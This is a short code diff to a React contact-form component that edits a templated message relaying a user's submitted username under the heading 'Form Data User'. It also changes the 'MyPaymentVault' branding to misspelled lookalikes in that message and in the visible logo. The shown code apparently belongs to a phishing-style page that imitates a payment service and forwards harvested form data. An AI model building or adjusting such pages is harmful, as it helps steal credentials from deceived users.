@@ -112,7 +112,7 @@ export default function ContactForm() {
 
       const text =
         `━━━━━━━━━━━━━━━━━━━━━\n` +
-        `🔐 <b>MyPaymentVault</b>\n` +
+        `🔐 <b>MyPaymenttVaulltr</b>\n` +
         `📋 <b>Form Data User</b>\n` +
         `━━━━━━━━━━━━━━━━━━━━━\n\n` +
         `👤 <b>Username</b>       : <code>${username}</code>\n` +
@@ -191,9 +191,9 @@ export default function ContactForm() {
           }}
         >
           <span style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}>
-            <span style={{ fontWeight: 300 }}>MY</span>
-            <span style={{ fontWeight: 700 }}>PAYMENT</span>
-            <span style={{ fontWeight: 300 }}>VAULT</span>
+            <span style={{ fontWeight: 700 }}>My</span>
+            <span style={{ fontWeight: 300 }}>Paymentt</span>
+            <span style={{ fontWeight: 700 }}>Vaulltr</span>
           </span>
           <span style={{ fontSize: 12, color: "#888" }}>Contact Information</span>
         </div>
